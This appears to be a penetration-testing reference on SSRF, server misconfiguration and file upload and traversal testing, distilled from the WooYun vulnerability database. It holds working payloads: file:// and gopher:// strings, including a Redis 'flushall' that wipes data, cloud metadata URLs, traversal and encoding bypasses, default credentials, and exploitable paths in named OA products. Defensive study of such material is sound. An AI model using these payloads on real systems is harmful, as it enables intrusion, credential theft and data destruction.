# Web Security - SSRF, Server Misconfiguration, Comprehensive Checklist

> Source: WooYun vulnerability database | split from web-file-infra.md (SSRF + misconfiguration + checklist + CMS/URL appendix)

## 4. SSRF and Protocol Abuse

### 4.1 Nature of the Vulnerability

```
Nature of SSRF: the server makes a request on the attacker's behalf, with the attacker controlling the request target
Risk: internal probing -> internal-service access -> file read -> command execution
```

### 4.2 Common Trigger Points

- The url parameter in a file-download feature
- An image-loading/proxy feature
- A web-preview/screenshot feature
- An import-from-URL feature
- A webhook/callback configuration

### 4.3 Protocol Abuse

```bash
# file:// - arbitrary file read
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - port probing / service interaction
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - craft arbitrary TCP requests
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - internal-network probing
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # cloud metadata
```

### 4.4 Bypass Techniques

```bash
# IP-variation bypass
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS rebinding: resolve to an external IP then quickly switch to 127.0.0.1
# Short link / 302 redirect: use an external URL to redirect to an internal address
```

### 4.5 Defenses

1. Whitelist restriction: restrict the request's target domain/IP
2. Protocol restriction: allow only http/https
3. Internal isolation: forbid requests to RFC1918 addresses and 127.0.0.1
4. DNS-resolution validation: after resolving, re-check the IP ownership
5. Disable redirects: or limit the redirect count and re-validate

---

## 5. Server Misconfiguration

### 5.1 Parsing Misconfiguration

| Issue | risk | check method |
|-----|------|---------|
| IIS 6.0 parsing vulnerability unpatched | `shell.asp;.jpg` is executable | test by uploading a semicolon-in-name file |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php` is parsed as PHP | upload an image and access `/img.jpg/x.php` |
| Apache multi-suffix parsing | `shell.php.xxx` is parsed | test by uploading a double-extension file |
| Upload directory can execute scripts | a webshell runs directly | test by uploading a script file |
| Directory listing enabled | exposes all files | access the directory URL to view |

### 5.2 Permission Misconfiguration

| Issue | Risk | Fix |
|-----|------|------|
| Web process runs with high privileges | direct root after escalation | run as a low-privilege user |
| Upload directory with 777 permissions | arbitrary write + execute | set 644/755 |
| Readable config file | credential leak | move it out of the web directory, restrict permissions |
| Admin panel without IP restriction | reachable from the internet | IP whitelist / VPN |

### 5.3 Default-Configuration Risks

```bash
# Default admin-panel paths
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# Default credentials (high frequency)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# Default debug ports
8080 (Tomcat) | 9090 (admin) | 3306 (MySQL on the internet)
6379 (Redis without a password) | 27017 (MongoDB without auth)
```

### 5.4 Spring Boot Actuator Leak

```bash
/actuator/env          # environment variables (including passwords)
/actuator/configprops  # configuration properties
/actuator/heapdump     # heap dump (contains sensitive data)
/actuator/mappings     # all URL mappings
```

---

## 6. Comprehensive Field Checklist

### 6.1 File-Upload Testing

- [ ] Scan common editor paths (FCKeditor/eWebEditor/UEditor)
- [ ] Disable JavaScript to test front-end validation
- [ ] Test extension bypass: case/double-write/special suffix/%00 truncation/semicolon truncation
- [ ] Change Content-Type to image/jpeg
- [ ] Add a GIF89a header / craft an image-embedded webshell
- [ ] Identify the server type, test the corresponding parsing vulnerabilities
- [ ] Test .htaccess/.user.ini upload parsing hijack
- [ ] Analyze file-naming rules, test path brute-forcing
- [ ] Test race-condition upload

### 6.2 File-Traversal Testing

- [ ] Identify file-related parameters (filename/path/file/url/download)
- [ ] Basic traversal: `../../../../../etc/passwd`
- [ ] Windows test: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URL-encoding bypass: `%2e%2e%2f` / double encoding `%252e%252e%252f`
- [ ] Unicode bypass: `%c0%ae%c0%ae/`
- [ ] Null-byte truncation: `../etc/passwd%00.jpg`
- [ ] Absolute path: `/etc/passwd` / `file:///etc/passwd`

### 6.3 Information-Disclosure Scanning

- [ ] Version control: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] Backup files: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] Config backups: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] Environment files: `/.env` `/.env.production`
- [ ] Probe files: `/phpinfo.php` `/info.php` `/test.php`
- [ ] Log files: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] Admin interfaces: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Assist searching with Google Hacking syntax

### 6.4 SSRF Testing

- [ ] Identify URL/proxy/callback parameters
- [ ] Test file:///etc/passwd protocol read
- [ ] Test internal addresses: http://127.0.0.1:port
- [ ] Cloud metadata: http://169.254.169.254/latest/meta-data/
- [ ] IP-variation bypass: hex/decimal/abbreviated notation
- [ ] DNS rebinding / 302-redirect bypass

---

## Appendix A: High-Risk CMS Vulnerability Quick Reference

| CMS/system | vulnerability type | path | condition |
|---------|---------|------|------|
| Wanhu OA ezOffice | arbitrary upload | `/defaultroot/dragpage/upload.jsp` | %00 truncation |
| Yonyou collaboration platform | arbitrary upload | `/oaerp/ui/sync/excelUpload.jsp` | bypass JS + brute-force the filename |
| Kingdee GSiS | arbitrary upload | `/kdgs/core/upload/upload.jsp` | registered user |
| Jinzhi Education epstar | file traversal | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | no authentication required |
| Seeyon OA | log leak | `/ctp.log` | direct access |


## Appendix C: Common Vulnerability URL Patterns

```bash
# PHP file traversal
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64-encoded path]

# JSP file traversal
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX file traversal
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Resin-specific
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **Supply chain / cloud deployment / framework CVEs** → moved to [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP smuggling/WebSocket/OAuth** → moved to [web-modern-protocols.md](web-modern-protocols.md)

*Distilled from the WooYun vulnerability database (88,636 entries) | For security research and defense reference only*
